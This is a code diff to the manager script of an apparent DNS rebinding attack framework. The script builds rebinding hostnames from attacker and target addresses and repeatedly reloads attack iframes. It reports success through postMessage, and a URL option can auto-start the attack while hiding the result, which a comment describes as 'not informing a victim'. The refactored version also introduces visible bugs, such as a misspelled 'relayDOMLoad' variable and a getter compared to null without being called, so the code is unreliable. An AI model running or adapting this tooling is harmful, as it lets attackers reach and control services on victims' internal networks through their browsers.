@@ -1,31 +1,52 @@
 /* Attack Management */
 
-// Global state
-let hosturl = "http://s-%1-%2-%3-%4-e.%5:%6/%7";
+const RunningConfiguration = () => {
 
-// Configuration
-let runningConfig = {};
-// Set URL parameter `startattack` to some value 
-// to automatically start attack upon loading manager.html page
-runningConfig.automatic = getParameterByName("startattack");
-// Set URL parameter `delaydomload` to some value 
-// to delay the browser DOM load event
-// and prevent premature exit of headless browsers
-runningConfig.delayDOMLoad = getParameterByName("delaydomload");
-// Set URL parameter `alertsuccess` to "false"
-// to not present an alert box upon a successful rebinding attack.
-// This may be useful for:
-// * not informing a victim that an attack completed
-// * or to freeze a headless browser forever (unless performing a DoS attack).
-runningConfig.alertSuccess = getParameterByName("alertsuccess");
+    let automatic = null;
+    let delayDOMLoad = null;
+    let alertSuccess = null;
 
-document.onreadystatechange = function () {
-    if (document.readyState === "interactive") {
-        if (runningConfig.delayDOMLoad === null) {
-            delaydomloadframe.parentNode.removeChild(delaydomloadframe);
+    // Obtains URL query parameters value based on name
+    // Uses https://stackoverflow.com/questions/901115/how-can-i-get-query-string-values-in-javascript
+    //as URLSearchParams API not supported by all browsers
+    // Returns `null` if  URL parameter `name` is not present, other its value.
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, '\\$&');
+        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+
+    return {
+        init() {
+            // Set URL parameter `startattack` to some value 
+            // to automatically start attack upon loading manager.html page
+            automatic = getParameterByName("startattack");
+            // Set URL parameter `delaydomload` to some value 
+            // to delay the browser DOM load event
+            // and prevent premature exit of headless browsers
+            relayDOMLoad = getParameterByName("delaydomload");
+            // Set URL parameter `alertsuccess` to "false"
+            // to not present an alert box upon a successful rebinding attack.
+            // This may be useful for:
+            // * not informing a victim that an attack completed
+            // * or to freeze a headless browser forever (unless performing a DoS attack).
+            alertSuccess = getParameterByName("alertsuccess");
+        },
+        getDelayDOMLoad() {
+            return delayDOMLoad;
+        },
+        getAutomatic() {
+            return automatic;
+        },
+        getAlertSuccess() {
+            return alertSuccess;
         }
     }
-};
+}
 
 const Frame = (id, url) => {
     let fmid = id;
@@ -65,14 +86,22 @@ const FrameManager = () => {
         return nextFrameIdVal++;
     };
     const origin = (url) => {
-        const u = new URL(url);
-        return `${u.protocol}//${u.hostname}:${u.port}`
+        //Does not work in IE11. 
+        //const u = new URL(url); 
+        // Workaround:
+        let  u = document.createElement('a');
+        let id = Math.random().toString();
+        u.setAttribute('href', url);
+        u.setAttribute('id', id);
+        const o = `${u.protocol}//${u.hostname}:${u.port}`
+        u.remove();
+        return o;
     };
     return {
         addFrame(url) {
             const frameId = `frame-${nextFrameId().toString()}`;
             frames.set(frameId, Frame(frameId, url));
-            origins.set(origin(url),frameId);
+            origins.set(origin(url), frameId);
             return frameId;
         },
         removeFrame(frameId) {
@@ -84,7 +113,7 @@ const FrameManager = () => {
             const oldurl = frames.get(frameId).getURL();
             const neworign = orign(url)
             origins.delete(origin(oldurl));
-            origins.set(neworigin,frameId);
+            origins.set(neworigin, frameId);
             frames.set(frameId, Frame(frameId, url));
         },
         frames() {
@@ -102,8 +131,6 @@ const FrameManager = () => {
     }
 };
 
-let fm = FrameManager();
-
 function addFrameToDOM(frame) {
     let f = document.createElement("iframe");
     f.src = frame.getURL();
@@ -118,17 +145,13 @@ function reloadAttackFrame(frame) {
     document.getElementById(frame.getId()).src = frame.getURL() + "?rnd=" + Math.random();
 }
 
-
-window.addEventListener("message", receiveMessage, false);
-
 // communication handler between manager and attack iframe.
 function receiveMessage(msg) {
     console.log("Message received from: ", msg.origin, msg.data.status);
 
-
     const fid = fm.getFrameOrigin(msg.origin)
     // If we don't have a frame ID for this message origin, dismiss message.
-    if (fid === undefined ){
+    if (fid === undefined) {
         return;
     };
 
@@ -159,7 +182,7 @@ function receiveMessage(msg) {
             delaydomloadframe.src = "about:blank";
         }, 10000);
 
-        if (runningConfig.alertSuccess !== "false") {
+        if (runningConfig.getAlertSuccess() !== "false") {
             alert("Attack Successful: " + document.domain + " " + msg.data.response);
         }
     };
@@ -191,12 +214,12 @@ function checkPayload() {
     return false;
 }
 
-// Commences attack
+// Starts attack
 function begin() {
     if (!checkPayload()) {
         alert("Please select an attack payload first.");
         return;
-    }
+    };
 
     let fid = fm.addFrame(hosturl
         .replace("%1", document.getElementById("attackhostipaddress").value)
@@ -211,11 +234,11 @@ function begin() {
 
     message.className = "d-block";
     start.disabled = true;
-   
+
     fm.frame(fid).setTimer(setInterval((() => {
         reloadAttackFrame(fm.frame(fid))
     }), parseInt(document.getElementById("interval").value) * 1000));
-    
+
     reloadAttackFrame(fm.frame(fid));
 }
 
@@ -273,38 +296,7 @@ function putData(url, data) {
         .then(response => response.json())
 }
 
-
-function forceCacheEviction() {
-    for (i = 0; i < 1000; i++) {
-        url = hosturl
-            .replace("%1", document.getElementById("attackhostipaddress").value)
-            .replace("%2", document.getElementById("targethostipaddress").value.replace(/-/g, '--'))
-            .replace("%3", "none")
-            .replace("%4", "cacheeviction" + (Number(0x0 + i).toString(16)))
-            .replace("%5", document.getElementById("attackhostdomain").value)
-            .replace("%6", document.getElementById("dummyport").value)
-            .replace("%7", document.getElementById("payloads").value) +
-            "?rnd=" + Math.random();
-        fetch(url).catch(error => error);
-    }
-}
-
-// Obtains URL query parameters value based on name
-// Uses https://stackoverflow.com/questions/901115/how-can-i-get-query-string-values-in-javascript
-//as URLSearchParams API not supported by all browsers
-// Returns `null` if  URL parameter `name` is not present, other its value.
-function getParameterByName(name, url) {
-    if (!url) url = window.location.href;
-    name = name.replace(/[\[\]]/g, '\\$&');
-    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
-        results = regex.exec(url);
-    if (!results) return null;
-    if (!results[2]) return '';
-    return decodeURIComponent(results[2].replace(/\+/g, ' '));
-}
-
 /* UI Stuff */
-
 // Obtain payloads and target specs from manager-config.json
 function getManagerConfig() {
     payloadsElement = document.getElementById('payloads');
@@ -335,6 +327,26 @@ function getManagerConfig() {
     return result;
 }
 
+// Start
+
+let hosturl = "http://s-%1-%2-%3-%4-e.%5:%6/%7";
+
+let fm = FrameManager();
+
+// Configuration
+let runningConfig = RunningConfiguration();
+runningConfig.init();
+
+// Remove the delaying of DOM load event if not required
+document.onreadystatechange = function () {
+    if (document.readyState === "interactive") {
+        if (runningConfig.getDelayDOMLoad === null) {
+            delaydomloadframe.parentNode.removeChild(delaydomloadframe);
+        }
+    }
+};
+
+window.addEventListener("message", receiveMessage, false);
 
 // Initialization after manager content is loaded.
 document.addEventListener("DOMContentLoaded", function (event) {
@@ -349,7 +361,7 @@ document.addEventListener("DOMContentLoaded", function (event) {
     // Once we have our HTTP servers config, payloads and targets
     Promise.all([HTTPServersConfig, payloadsAndTargets]).then(function (values) {
         //start attack on page load if ?startattack is set      
-        if (runningConfig.automatic !== null) {
+        if (runningConfig.getAutomatic() !== null) {
             begin();
         }
     });
